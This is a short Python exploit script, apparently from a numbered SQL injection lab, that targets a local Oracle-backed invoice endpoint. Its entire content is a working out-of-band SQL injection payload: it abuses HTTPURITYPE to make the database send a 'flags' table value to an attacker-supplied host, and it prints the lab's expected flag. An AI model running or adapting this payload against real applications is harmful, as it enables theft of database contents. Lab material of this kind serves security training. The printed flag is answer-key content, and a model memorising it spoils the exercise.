#!/usr/bin/env python3
"""SQLi-040: Oracle OOB HTTP via HTTPURITYPE"""
import requests, argparse

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5040/invoice")
    parser.add_argument("--oob", required=True)
    args = parser.parse_args()
    
    payload = f"1 AND (SELECT HTTPURITYPE('{args.oob}/'||(SELECT value FROM flags WHERE ROWNUM=1)).GETCLOB() FROM dual) IS NOT NULL--"
    try:
        requests.get(args.target, params={"id": payload}, timeout=10)
    except: pass
    
    print(f"[*] Check HTTP: {args.oob}")
    print("[*] Expected: FLAG{oracle_httpuritype_oob}")

if __name__ == "__main__":
    main()
